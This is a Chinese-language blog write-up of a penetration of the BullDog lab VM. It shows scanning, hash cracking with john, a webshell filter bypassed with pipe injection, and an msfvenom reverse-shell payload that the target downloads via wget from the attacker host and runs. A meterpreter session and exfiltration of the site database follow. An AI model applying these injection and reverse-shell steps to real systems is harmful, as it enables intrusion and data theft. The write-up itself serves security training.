<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>BullDog-writeup | Zoukba&#39;s gun</title>
  <meta name="author" content="zoukba">
  
  <meta name="description" content="BULLDOG端口扫描nmap1234567891011121314Nmap scan report for 172.20.10.12Host is up (0.00076s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)|_http-title: Bulldog Industries8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)|_http-title: Bulldog IndustriesService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

可以看出靶机是个基于pythonweb框架的网站

路径扫描dirmap12[200][text/html; charset=utf-8][3.46kb] http://172.20.10.12/dev/[200][text/plain][1.05kb] http://172.20.10.12/robots.txt

DirBruster12http://172.20.10.12/admin/login/http://172.20.10.12/dev/shell/"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="BullDog-writeup"/>
  <meta property="og:site_name" content="Zoukba&#39;s gun"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/[object Object]" title="Zoukba&#39;s gun" type="application/atom+xml">
  
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 5.4.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Zoukba&#39;s gun</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-user"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> BullDog-writeup</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="BULLDOG"><a href="#BULLDOG" class="headerlink" title="BULLDOG"></a>BULLDOG</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 172.20.10.12</span><br><span class="line">Host is up (0.00076s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 20:8b:<span class="built_in">fc</span>:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)</span><br><span class="line">|   256 <span class="built_in">cd</span>:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)</span><br><span class="line">|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)</span><br><span class="line">80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<ul>
<li>可以看出靶机是个基于pythonweb框架的网站</li>
</ul>
<h2 id="路径扫描"><a href="#路径扫描" class="headerlink" title="路径扫描"></a>路径扫描</h2><h3 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[200][text/html; charset=utf-8][3.46kb] http://172.20.10.12/dev/</span><br><span class="line">[200][text/plain][1.05kb] http://172.20.10.12/robots.txt</span><br></pre></td></tr></table></figure>

<h3 id="DirBruster"><a href="#DirBruster" class="headerlink" title="DirBruster"></a>DirBruster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.20.10.12/admin/login/</span><br><span class="line">http://172.20.10.12/dev/shell/</span><br></pre></td></tr></table></figure>

<h2 id="网站内敏感信息搜集"><a href="#网站内敏感信息搜集" class="headerlink" title="网站内敏感信息搜集"></a>网站内敏感信息搜集</h2><h3 id="Content"><a href="#Content" class="headerlink" title="Content"></a>Content</h3><p><a target="_blank" rel="noopener" href="http://172.20.10.12/dev/">http://172.20.10.12/dev/</a> 页面下得到hash值以及邮箱</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Need these password hashes <span class="keyword">for</span> testing. Django<span class="string">&#x27;s default is too complex--&gt;</span></span><br><span class="line"><span class="string">	&lt;!--We&#x27;</span>ll remove these <span class="keyword">in</span> prod. It<span class="string">&#x27;s not like a hacker can do anything with a hash--&gt;</span></span><br><span class="line"><span class="string">	Team Lead: alan@bulldogindustries.com&lt;br&gt;&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;</span></span><br><span class="line"><span class="string">	Back-up Team Lead: william@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;</span></span><br><span class="line"><span class="string">	Front End: malik@bulldogindustries.com&lt;br&gt;&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;</span></span><br><span class="line"><span class="string">	Front End: kevin@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;</span></span><br><span class="line"><span class="string">	Back End: ashley@bulldogindustries.com&lt;br&gt;&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;</span></span><br><span class="line"><span class="string">	Back End: nick@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;</span></span><br><span class="line"><span class="string">	Database: sarah@bulldogindustries.com&lt;br&gt;&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p><a target="_blank" rel="noopener" href="http://172.20.10.12/dev/shell/">http://172.20.10.12/dev/shell/</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418222235.png"></p>
<ul>
<li>提示要使用网站管理员的凭据，才能使用此Webshell页面</li>
</ul>
<h2 id="Hash爆破进入后台"><a href="#Hash爆破进入后台" class="headerlink" title="Hash爆破进入后台"></a>Hash爆破进入后台</h2><h3 id="John爆破猜解Hash值"><a href="#John爆破猜解Hash值" class="headerlink" title="John爆破猜解Hash值"></a>John爆破猜解Hash值</h3><ul>
<li><p>hash.txt</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    6515229daf8dbdc8b89fed2e60f107433da5f2cb</span><br><span class="line">38882f3b81f8f2bc47d9f3119155b05f954892fb</span><br><span class="line">c6f7e34d5d08ba4a40dd5627508ccb55b425e279</span><br><span class="line">0e6ae9fe8af1cd4192865ac97ebf6bda414218a9</span><br><span class="line">553d917a396414ab99785694afd51df3a8a8a3e0</span><br><span class="line">ddf45997a7e18a25ad5f5cf222da64814dd060d5</span><br><span class="line">d8b8dd5e7f000b8dea26ef8428caf38c04466b3e</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用john爆破出密码</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;raw-sha1 hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 7 password hashes with no different salts (Raw-SHA1 [SHA1 256&#x2F;256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support for this hash type, consider --fork&#x3D;2</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">bulldog          (?)</span><br><span class="line">bulldoglover     (?)</span><br><span class="line">Warning: Only 5 candidates left, minimum 8 needed for performance.</span><br><span class="line">2g 0:00:00:01 DONE (2021-04-18 13:11) 1.562g&#x2F;s 11205Kp&#x2F;s 11205Kc&#x2F;s 63376KC&#x2F;s ▒xCvBnM,..*7¡Vamos!</span><br><span class="line">Use the &quot;--show --format&#x3D;Raw-SHA1&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">由于我这里没有给出用户名，所以我还是需要Burp抓包爆破一下</span><br><span class="line"></span><br><span class="line">+ 使用Burp基于所给出的密码以及账号（我是用过邮箱猜解的）</span><br><span class="line"></span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418222809.png)</span><br><span class="line">    </span><br><span class="line">+ 得到账号nike和sarah</span><br><span class="line"></span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223044.png)</span><br><span class="line">    </span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223112.png)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">## 利用之前的Webshell页面进行进一步渗透</span><br><span class="line"></span><br><span class="line">### 查看Webshell页面</span><br><span class="line"></span><br><span class="line">![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223147.png)</span><br><span class="line"></span><br><span class="line">得到了命令执行界面，这里的逻辑是只能使用给出的命令</span><br><span class="line"></span><br><span class="line">+ 测试使用&#96;&#96;&#96;|,&amp;&#96;&#96;&#96;可以绕过限制；我使用的是&#96;&#96;&#96; | &#96;&#96;&#96;他会执行后面的命令，命令限制只匹配第一个输入，所以我在后面构造语句</span><br><span class="line"></span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223407.png)</span><br><span class="line">    </span><br><span class="line">+ 存在python环境</span><br><span class="line"></span><br><span class="line">    &#96;&#96;&#96;bash</span><br><span class="line">    Command : ls | python -h</span><br><span class="line">usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...</span><br><span class="line">Options and arguments (and corresponding environment variables):</span><br><span class="line">-B     : don&#39;t write .py[co] files on import; also PYTHONDONTWRITEBYTECODE&#x3D;x</span><br><span class="line">-c cmd : program passed in as string (terminates option list)</span><br><span class="line">-d     : debug output from parser; also PYTHONDEBUG&#x3D;x</span><br><span class="line">-E     : ignore PYTHON* environment variables (such as PYTHONPATH)</span><br><span class="line">-h     : print this help message and exit (also --help)</span><br><span class="line">-i     : inspect interactively after running script; forces a prompt even</span><br><span class="line">         if stdin does not appear to be a terminal; also PYTHONINSPECT&#x3D;x</span><br><span class="line">-m mod : run library module as a script (terminates option list)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><p>存在perl环境</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Command : ls | perl -v</span><br><span class="line">This is perl 5, version 22, subversion 1 (v5.22.1) built <span class="keyword">for</span> x86_64-linux-gnu-thread-multi</span><br><span class="line">(with 58 registered patches, see perl -V <span class="keyword">for</span> more detail)</span><br><span class="line"></span><br><span class="line">Copyright 1987-2015, Larry Wall</span><br><span class="line"></span><br><span class="line">Perl may be copied only under the terms of either the Artistic License or the</span><br><span class="line">GNU General Public License, <span class="built_in">which</span> may be found <span class="keyword">in</span> the Perl 5 <span class="built_in">source</span> kit.</span><br><span class="line"></span><br><span class="line">Complete documentation <span class="keyword">for</span> Perl, including FAQ lists, should be found on</span><br><span class="line">this system using <span class="string">&quot;man perl&quot;</span> or <span class="string">&quot;perldoc perl&quot;</span>.  If you have access to the</span><br><span class="line">Internet, point your browser at http://www.perl.org/, the Perl Home Page.</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="使用python结合msf进行回弹（其实在这样的靶机下nc足够了）"><a href="#使用python结合msf进行回弹（其实在这样的靶机下nc足够了）" class="headerlink" title="使用python结合msf进行回弹（其实在这样的靶机下nc足够了）"></a>使用python结合msf进行回弹（其实在这样的靶机下nc足够了）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=4444 -f raw -o /Users/a0/www/payload.py</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload</span><br><span class="line">[-] No arch selected, selecting arch: python from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 493 bytes</span><br><span class="line">Saved as: /Users/a0/www/payload.py</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; python/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  172.20.10.2      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用python搭建服务器，一会用目标机去下载（生成的payload文件要放在www下）    </p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    python3 -m http.server 9900</span><br><span class="line">Serving HTTP on :: port 9900 (http://[::]:9900/) ...</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
</li>
<li><p>构造语句执行</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    ls | wget http://172.20.10.2:9900/payload.py</span><br><span class="line">ls | python payload.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>回弹得到shell</p>
<p>  <img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418224319.png"></p>
</li>
</ul>
<h2 id="linux内的信息搜集"><a href="#linux内的信息搜集" class="headerlink" title="linux内的信息搜集"></a>linux内的信息搜集</h2><ul>
<li><p>sysinfo</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    meterpreter &gt; sysinfo</span><br><span class="line">Computer        : bulldog</span><br><span class="line">OS              : Linux 4.4.0-87-generic <span class="comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017</span></span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Meterpreter     : python/linux</span><br></pre></td></tr></table></figure>
</li>
<li><p>ps</p>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    926    1     snapd              root              /usr/lib/snapd/snapd</span><br><span class="line">943    919   CRON               root              /usr/sbin/CRON -f</span><br><span class="line">960    1     polkitd            root              /usr/lib/policykit-1/polkitd --no-debug</span><br><span class="line">962    1     mdadm              root              /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog</span><br><span class="line">968    943   sh                 root              /bin/sh -c <span class="built_in">cd</span> /home/django/bulldog &amp;&amp; sudo -u django python /home/django/bulldog/manage.py runserver 0.0.0.0:8080 --insecure</span><br><span class="line">973    968   sudo               root              sudo -u django python /home/django/bulldog/manage.py runserver 0.0.0.0:8080 --insecure</span><br><span class="line">976    973   python             django            python /home/django/bulldog/manage.py runserver 0.0.0.0:8080 --insecure</span><br><span class="line">982    2     [ttm_swap]         root</span><br><span class="line">1042   1     sshd               root              /usr/sbin/sshd -D </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>ls</p>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">Listing: /home/django/bulldog</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">40775/rwxrwxr-x   4096   dir   2017-08-25 07:23:25 +0800  bulldog</span><br><span class="line">100757/rwxr-xrwx  41984  fil   2021-04-18 13:26:47 +0800  db.sqlite3</span><br><span class="line">100755/rwxr-xr-x  250    fil   2017-08-25 07:22:04 +0800  manage.py</span><br><span class="line">100644/rw-r--r--  250    fil   2021-04-18 14:10:25 +0800  payload.elf</span><br><span class="line">100644/rw-r--r--  493    fil   2021-04-18 14:26:56 +0800  payload.py</span><br><span class="line">100644/rw-r--r--  493    fil   2021-04-18 14:27:08 +0800  payload.py.1</span><br></pre></td></tr></table></figure>

<p>   由此我发现managy.py文件启动这个web服务；且在bulldog文件下存在一个数据库文件db.sqlite3</p>
</li>
</ul>
<h2 id="查看db-sqlite3-拿到administrator用户"><a href="#查看db-sqlite3-拿到administrator用户" class="headerlink" title="查看db.sqlite3 拿到administrator用户"></a>查看db.sqlite3 拿到administrator用户</h2><h3 id="将db-sqlite3下载到本地"><a href="#将db-sqlite3下载到本地" class="headerlink" title="将db.sqlite3下载到本地"></a>将db.sqlite3下载到本地</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download db.sqlite3 /Users/a0/Desktop/BullDog</span><br></pre></td></tr></table></figure>

<h3 id="在使用Navicat-Premium查看"><a href="#在使用Navicat-Premium查看" class="headerlink" title="在使用Navicat Premium查看"></a>在使用Navicat Premium查看</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418225951.png"></p>
<p>使用sha254基本就凉凉了，我将知道账号密码的nick、以及sarah的权限提到了superuser（后期来看没有什么用，当时一心想要换个shell，总感觉python不靠谱。其实当时已经可以执行命令了，直接上个elf就得了！！！）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload /Users/a0/Desktop/BullDog/db.sqlite3</span><br><span class="line"><span class="comment">#上传覆盖掉原来的数据库文件</span></span><br><span class="line">python manege.py serverstart</span><br><span class="line"><span class="comment">#重新运行服务器脚本启动</span></span><br></pre></td></tr></table></figure>

<h3 id="上后台一无所获，索然无味"><a href="#上后台一无所获，索然无味" class="headerlink" title="上后台一无所获，索然无味"></a>上后台一无所获，索然无味</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418230351.png"></p>
<p>其实换个思路来说，网站后台到了administrator权限</p>
<h2 id="使用各种CVE提权（这里均失败了，我就不提了）"><a href="#使用各种CVE提权（这里均失败了，我就不提了）" class="headerlink" title="使用各种CVE提权（这里均失败了，我就不提了）"></a>使用各种CVE提权（这里均失败了，我就不提了）</h2><ul>
<li>使用sudo提权–CVE-2021-3156</li>
<li>脏牛提权–CVE-2016-5195</li>
</ul>
<h3 id="最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）"><a href="#最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）" class="headerlink" title="最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）"></a>最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）</h3><ul>
<li><p>贴一条查看环境命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env			<span class="comment">#查看环境</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>		<span class="comment">#查看路径</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h2><h3 id="巧合"><a href="#巧合" class="headerlink" title="巧合"></a>巧合</h3><p>我在做搜集的时候一直是在网站目录下；直到我发现了一个bulldogadmin，在这个文件中发现了.hiddenadmindirectory，好家伙！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/django</span><br><span class="line">$ <span class="built_in">cd</span> ../.</span><br><span class="line">$ ls -a</span><br><span class="line">.  ..  bulldogadmin  django</span><br><span class="line">$ <span class="built_in">cd</span> bulldogadmin</span><br><span class="line">$ ls -a</span><br><span class="line">.	      .cache		     .selected_editor</span><br><span class="line">..	      .hiddenadmindirectory  .sudo_as_admin_successful</span><br><span class="line">.bash_logout  .nano		     .wget-hsts</span><br><span class="line">.bashrc       .profile</span><br><span class="line">$ <span class="built_in">cd</span> .hiddenadmindirectory</span><br><span class="line">$ ls</span><br><span class="line">customPermissionApp  note</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/bulldogadmin/.hiddenadmindirectory</span><br></pre></td></tr></table></figure>

<h3 id="查看note获取提示"><a href="#查看note获取提示" class="headerlink" title="查看note获取提示"></a>查看note获取提示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat note</span><br><span class="line">Nick,</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m working on the backend permission stuff. Listen, it&#x27;</span>s super prototype but I think it<span class="string">&#x27;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;</span>s great stuff! Once I<span class="string">&#x27;m finished with it, a hacker wouldn&#x27;</span>t even be able to reverse it! Keep <span class="keyword">in</span> mind that it<span class="string">&#x27;s still a prototype right now. I am about to get it working with the Django user account. I&#x27;</span>m not sure how I<span class="string">&#x27;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let me know what you think of it!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-Ashley</span></span><br></pre></td></tr></table></figure>

